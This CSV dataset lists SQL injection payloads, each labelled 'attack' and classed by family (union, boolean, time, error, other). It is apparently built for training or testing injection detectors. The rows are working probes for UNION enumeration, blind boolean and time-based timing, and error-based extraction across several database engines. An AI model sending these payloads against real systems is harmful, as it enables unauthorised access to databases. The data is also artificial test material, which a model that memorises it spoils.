label,payload,family
attack,"1'  )   where 2802  =  2802 union all select null,null,null#",union
attack,1   )    )    as myxo where 1759  =  1759 union all select null#,union
attack,"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ksxz""  =  ""ksxz",boolean
attack,select   (  case when   (  3168  =  5577  )   then 3168 else 3168*  (  select 3168 from mysql.db  )   end  )  #,other
attack,1  )   waitfor delay '0:0:5',time
attack,"1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'onmp'  =  'onmp",boolean
attack,"-7248""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms",error
attack,1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,boolean
attack,"-7234""  )   union all select 3154,3154,3154,3154#",union
attack,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",union
attack,-8521'+  (  select ucim where 9003  =  9003 union all select 9003--,union
attack,"1""   )    )    order by 1--",other
attack,"1""  )   where 9656  =  9656 and sleep  (  5  )  --",time
attack,"-2500'   )    )     )   union all select 6853,6853,6853,6853--",union
attack,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",boolean
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'glfq' like 'glfq,time
attack,"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",union
attack,"iif  (  7036  =  2370,1,1/0  )  ",other
attack,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",union
attack,"1%""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,error
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",boolean
attack,"-7395%"" order by 1--",other
attack,"1"" where 9241  =  9241 union all select null#",union
attack,"1"" where 8483  =  8483 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#",union
attack,"1'  )   where 6248  =  6248 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",union
attack,-4518 where 8023  =  8023 or 6872  =  6872--,boolean
attack,"1'  )   as gxpb where 7107  =  7107 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",error
attack,"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--",union
attack,"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",boolean
attack,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",union
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'fgcg'  =  'fgcg",time
attack,"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",boolean
attack,"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""azmf""  =  ""azmf",time
attack,"1%'  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",boolean
attack,"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'rbhe'  =  'rbhe",boolean
attack,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt",boolean
attack,"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'bmbt'  =  'bmbt",boolean
attack,"1  )   as iovi where 3910  =  3910 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"1""  )   where 4182  =  4182 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",error
attack,"-8065""   )    )     )   order by 1--",other
attack,"1%""   )    )     )   order by 1#",other
attack,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",error
attack,1'  )   as znak where 5203  =  5203,other
attack,-2348  )   as sige where 1639  =  1639 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,error
attack,"1   )    )    as qgok where 3993  =  3993 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",time
attack,"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#",union
attack,"-8344 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wjpa",boolean
attack,"1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  4557  =  4557",boolean
attack,"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",error
attack,1'+  (  select bjav where 6923  =  6923 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"-8633"" or 5099  =  5974",boolean
attack,"1"" and   (  1668  =  8054  )  *8054",boolean
attack,-1643' where 1968  =  1968 or 3484  =  6642,boolean
attack,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'gxgi'  =  'gxgi",boolean
attack,"1'||  (  select 'yags' where 6268  =  6268 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",boolean
attack,"1""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""qpzj"" like ""qpzj",boolean
attack,"1'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",error
attack,"1 where 9898  =  9898 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",boolean
attack,"-9142%""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,boolean
attack,"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",union
attack,"1%""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,boolean
attack,"1"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",boolean
attack,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,boolean
attack,"1'+  (  select uqdb where 3508  =  3508 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"-3437  )   union all select 7774,7774,7774--",union
attack,select   (  case when   (  2914  =  3335  )   then 2914 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,error
attack,-6341' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'ugys'  =  'ugys,boolean
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""nwjv""  =  ""nwjv",boolean
attack,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",union
attack,"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,boolean
attack,-8274'   )    )    union all select 3048--,union
attack,-6203'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'luee'  =  'luee,boolean
attack,"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb",boolean
attack,"1'  )   where 8835  =  8835 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",union
attack,select sleep  (  5  )   and 'mlmu'  =  'mlmu,time
attack,"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'jmub'  =  'jmub",boolean
attack,"-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",union
attack,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",error
attack,"-7793""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""lias""  =  ""lias",boolean
attack,"1' where 6853  =  6853 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",error
attack,"1%""   )    )   ",other
attack,1'+  (  select 'yyyn' where 5395  =  5395,other
attack,1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'sgdj' like 'sgdj,error
attack,"1%"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,error
attack,"-3359 union all select 4675,4675,4675--",union
attack,"1""  )   where 9545  =  9545 and 9198  =  9198--",boolean
attack,"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'luoj'  =  'luoj",error
attack,"-9263'  )   as qodg where 6798  =  6798 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",error
attack,select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,error
attack,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   # pkcp,time
attack,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'yctp'  =  'yctp,time
attack,"1""  )   where 2388  =  2388 union all select null,null,null,null,null,null,null,null,null--",union
attack,"1""  )   union all select null,null,null--",union
attack,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""tepf""  =  ""tepf",error
attack,"1' union all select null,null--",union
attack,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",error
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'pfle' like 'pfle,time
attack,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",boolean
attack,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",union
attack,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",time
attack,"1'  )   where 3330  =  3330 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"1'  )   where 9226  =  9226 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1'  )   union all select null,null,null,null,null,null,null#",union
attack,"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'ccsb'  =  'ccsb",boolean
attack,"1   )    )    as pjjz where 8384  =  8384 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",error
attack,"select * from generate_series  (  3341,3341,case when   (  3341  =  3072  )   then 1 else 0 end  )   limit 1--",other
attack,"-4407""  )   where 2055  =  2055 or elt  (  9714  =  5040,5040  )  --",boolean
attack,"-5898""   )    )    as fycd where 7135  =  7135 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
attack,"1"" where 8978  =  8978 union all select null,null,null,null,null,null,null,null--",union
attack,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'stqq'  =  'stqq",boolean
attack,1%',other
attack,"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""zzcd""  =  ""zzcd",boolean
attack,-2951 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # gwqv,error
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",boolean
attack,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",error
attack,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",boolean
attack,"1'  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"-4746%""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,error
attack,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",boolean
attack,"-2211"" or 2113  =  8885#",boolean
attack,1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'nfix'  =  'nfix,error
attack,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'efpc' like 'efpc",boolean
attack,"1   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6265  =  6265",boolean
attack,1%'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',boolean
attack, (  select   (  case when   (  9337  =  9337  )   then waitfor delay '0:0:5' else 9337*  (  select 9337 from master..sysdatabases  )   end   )    ) ,time
attack,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",error
attack,"-8725""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""vblw"" like ""vblw",boolean
attack,1%'   )    ) ,other
attack,1' and 5835  =  6157 and 'bjee' like 'bjee,boolean
attack,"make_set  (  5679  =  9769,9769  )  ",other
attack,1  )   where 5629  =  5629,other
attack,"-4528""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""fxmt"" like ""fxmt",boolean
attack,-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,boolean
attack,"-3747""  )   union all select 8962,8962,8962,8962,8962#",union
attack,"-8893  )   union all select 7594,7594,7594,7594,7594,7594#",union
attack,1  )   or sleep  (  5  )   and   (  2211  =  2211,time
attack,1%'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',time
attack,"1""  )   where 4520  =  4520",other
attack,1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,boolean
attack,"1%"" and 7533  =  7533 and ""%""  =  """,boolean
attack,"-6996%"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,"1'||  (  select 'qjwf' from dual where 3187  =  3187 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",boolean
attack,"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""cdai""  =  ""cdai",boolean
attack,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",error
attack,"-1258""   )    )    union all select 7734,7734,7734#",union
attack,1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # lexm,error
attack,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'lywy' like 'lywy",error
attack,1 where 6518  =  6518,other
attack,"1%"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,boolean
attack,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",union
attack,1' where 5547  =  5547,other
attack,"1 where 8908  =  8908 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",time
attack,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,"1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",time
attack,"-5963"" or 9323  =  9323#",boolean
attack,1' where 8584  =  8584 order by 1#,other
attack,1   )    ) ,other
attack,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",boolean
attack,"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'vtno'  =  'vtno",boolean
attack,"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",boolean
attack,"select * from generate_series  (  4975,4975,case when   (  4975  =  9615  )   then 1 else 0 end  )   limit 1--",other
attack,"1""  )   as tqxa where 6751  =  6751 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",boolean
attack,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",time
attack,"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1%""   )    )    union all select null,null,null#",union
attack,-2364' or 6743  =  7578,boolean
